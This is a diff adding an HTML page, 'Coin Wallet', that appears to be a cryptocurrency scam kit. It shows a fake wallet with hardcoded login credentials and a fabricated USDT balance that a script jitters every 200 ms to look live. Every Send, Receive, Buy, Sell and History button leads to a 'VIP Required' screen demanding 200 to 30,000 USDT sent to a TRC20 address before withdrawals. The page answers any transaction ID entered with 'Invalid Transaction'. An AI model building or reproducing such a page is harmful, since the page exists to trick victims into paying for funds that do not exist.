@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Coin Wallet</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body{
+    margin:0;
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+    background:#0b0f14;
+    color:#fff;
+}
+.container{
+    max-width:430px;
+    margin:auto;
+    padding:16px;
+}
+
+/* GLOBAL HEADER */
+.site-name{
+    text-align:center;
+    font-size:22px;
+    font-weight:700;
+    color:#f5c542;
+    margin:10px 0 20px;
+}
+
+/* LOGIN */
+.login-box{
+    margin-top:60px;
+    background:#111822;
+    border-radius:18px;
+    padding:24px;
+}
+.login-box h2{
+    text-align:center;
+    margin-bottom:15px;
+}
+.login-box input{
+    width:100%;
+    padding:14px;
+    margin:10px 0;
+    border-radius:12px;
+    border:none;
+    background:#0b0f14;
+    color:#fff;
+}
+.login-box button{
+    width:100%;
+    padding:14px;
+    background:#f5c542;
+    border:none;
+    border-radius:12px;
+    font-size:16px;
+    font-weight:600;
+    cursor:pointer;
+}
+
+/* WALLET */
+.wallet{
+    display:none;
+}
+.wallet-card{
+    background:#111822;
+    border-radius:20px;
+    padding:20px;
+}
+.wallet-title{
+    font-size:13px;
+    opacity:.7;
+}
+.balance{
+    font-size:34px;
+    font-weight:600;
+    margin-top:6px;
+}
+.balance span{
+    font-weight:600;
+    font-size:28px;
+}
+.pnl{
+    font-size:13px;
+    margin-top:6px;
+    color:#4cff9a;
+    font-weight:500;
+}
+
+/* ACTIONS */
+.actions{
+    display:flex;
+    justify-content:space-between;
+    margin:20px 0;
+}
+.action{
+    width:18%;
+    text-align:center;
+    cursor:pointer;
+}
+.action-icon{
+    width:55px;
+    height:55px;
+    background:#1a2230;
+    border-radius:50%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:22px;
+    margin:auto;
+}
+.action span{
+    font-size:12px;
+    margin-top:6px;
+    display:block;
+}
+
+/* MARKET */
+.market{
+    background:#111822;
+    border-radius:20px;
+    padding:15px;
+}
+.market h4{
+    margin:0 0 10px;
+    font-size:14px;
+    opacity:.8;
+}
+.coin{
+    display:flex;
+    justify-content:space-between;
+    padding:10px 0;
+    border-bottom:1px solid #1a2230;
+    font-size:14px;
+}
+.coin:last-child{
+    border-bottom:none;
+}
+
+/* VIP */
+.vip{
+    display:none;
+}
+.vip-box{
+    background:#111822;
+    border-radius:20px;
+    padding:22px;
+}
+.vip-box h2{
+    text-align:center;
+    color:#f5c542;
+}
+.plan{
+    border:1px solid #1a2230;
+    border-radius:12px;
+    padding:12px;
+    margin:10px 0;
+}
+.wallet-address{
+    background:#0b0f14;
+    padding:12px;
+    border-radius:12px;
+    font-size:13px;
+    word-break:break-all;
+}
+
+/* Transaction ID */
+.transaction-id-label{
+    margin-top:15px;
+    font-weight:600;
+}
+.transaction-id-input{
+    width:100%;
+    padding:10px;
+    border-radius:12px;
+    border:none;
+    margin-top:5px;
+    background:#0b0f14;
+    color:#fff;
+}
+
+/* NEXT BUTTON */
+.next-btn{
+    width:100%;
+    padding:12px;
+    margin-top:12px;
+    background:#f5c542;
+    border:none;
+    border-radius:12px;
+    cursor:pointer;
+    font-weight:600;
+}
+
+/* ERROR MESSAGE */
+#errorMsg{
+    color:#ff4c4c;
+    text-align:center;
+    margin-top:10px;
+    display:none;
+    font-weight:600;
+}
+
+/* BACK */
+.back-btn{
+    background:#1a2230;
+    border:none;
+    color:#fff;
+    padding:10px 14px;
+    border-radius:12px;
+    margin-bottom:12px;
+    cursor:pointer;
+}
+</style>
+</head>
+
+<body>
+<div class="container">
+
+<div class="site-name">Coin Wallet</div>
+
+<!-- LOGIN -->
+<div class="login-box" id="loginPage">
+    <h2>Login</h2>
+    <input type="email" id="email" placeholder="Email">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="login()">Login</button>
+</div>
+
+<!-- WALLET -->
+<div class="wallet" id="walletPage">
+    <div class="wallet-card">
+        <div class="wallet-title">Main Wallet</div>
+        <div class="balance" id="balance">892,315 <span>USDT</span></div>
+        <div class="pnl">Today PNL: +0.79% (+0.00218 USDT)</div>
+
+        <div class="actions">
+            <div class="action" onclick="goVIP()">
+                <div class="action-icon">↑</div>
+                <span>Send</span>
+            </div>
+            <div class="action" onclick="goVIP()">
+                <div class="action-icon">↓</div>
+                <span>Receive</span>
+            </div>
+            <div class="action" onclick="goVIP()">
+                <div class="action-icon">💳</div>
+                <span>Buy</span>
+            </div>
+            <div class="action" onclick="goVIP()">
+                <div class="action-icon">🏦</div>
+                <span>Sell</span>
+            </div>
+            <div class="action" onclick="goVIP()">
+                <div class="action-icon">🕘</div>
+                <span>History</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="market" style="margin-top:16px;">
+        <h4>Market Prices</h4>
+        <div class="coin"><span>BTC</span><span>$95,005</span></div>
+        <div class="coin"><span>ETH</span><span>$3,330</span></div>
+        <div class="coin"><span>BNB</span><span>$903.12</span></div>
+        <div class="coin"><span>SOL</span><span>$139.64</span></div>
+        <div class="coin"><span>XRP</span><span>$2.05</span></div>
+        <div class="coin"><span>USDT</span><span>$0.999</span></div>
+    </div>
+</div>
+
+<!-- VIP -->
+<div class="vip" id="vipPage">
+    <button class="back-btn" onclick="backToWallet()">← Back</button>
+
+    <div class="vip-box">
+        <h2>VIP Required</h2>
+        <p>You must subscribe to VIP before withdrawals.</p>
+
+        <div class="plan">1 Week – <strong>200 USDT</strong></div>
+        <div class="plan">1 Month – <strong>600 USDT</strong></div>
+        <div class="plan">1 Year – <strong>5,000 USDT</strong></div>
+        <div class="plan">Lifetime – <strong>30,000 USDT</strong></div>
+
+        <p><strong>Network:</strong> TRC20</p>
+        <div class="wallet-address">
+            TBYFfFTbwFrTDJNhK8FJ9kazD3CJfPYwGS
+        </div>
+
+        <!-- Transaction ID -->
+        <p class="transaction-id-label">Transaction ID:</p>
+        <input type="text" id="transactionID" placeholder="Enter your Transaction ID" class="transaction-id-input">
+
+        <!-- Next Button -->
+        <button id="nextBtn" class="next-btn">Next</button>
+
+        <!-- Error Message -->
+        <p id="errorMsg">Invalid Transaction</p>
+    </div>
+</div>
+
+</div>
+
+<script>
+let balanceValue = 892315; // قيمة البداية للمحفظة
+
+function login(){
+    if(
+        email.value==="brad9900@gmail.com" &&
+        password.value==="brad9900life"
+    ){
+        loginPage.style.display="none";
+        walletPage.style.display="block";
+        startBalanceFluctuation(); // بدء تحديث الرصيد بسرعة
+    }else{
+        alert("Invalid login");
+    }
+}
+
+function goVIP(){
+    walletPage.style.display="none";
+    vipPage.style.display="block";
+}
+
+function backToWallet(){
+    vipPage.style.display="none";
+    walletPage.style.display="block";
+}
+
+// Transaction ID Next Button
+document.getElementById("nextBtn").addEventListener("click", function(){
+    const tx = document.getElementById("transactionID").value.trim();
+    if(tx !== ""){ 
+        const error = document.getElementById("errorMsg");
+        error.style.display = "block"; 
+        setTimeout(() => {
+            error.style.display = "none"; 
+        }, 2000);
+    }
+});
+
+// تحديث الرصيد بسرعة ±50 دولار مع أحيانًا القفز إلى 893,312
+function startBalanceFluctuation(){
+    setInterval(()=>{
+        // احتمال 5% للقفز إلى 893312
+        if(Math.random() < 0.05){
+            balanceValue = 893312;
+        } else {
+            let change = Math.floor(Math.random() * 101) - 50; // من -50 إلى +50
+            balanceValue += change;
+            if(balanceValue < 0) balanceValue = 0; // لا يصبح سالب
+        }
+        document.getElementById("balance").innerHTML = balanceValue.toLocaleString() + ' <span>USDT</span>';
+    }, 200); // تحديث كل 200 مللي ثانية
+}
+</script>
+
+</body>
+</html>
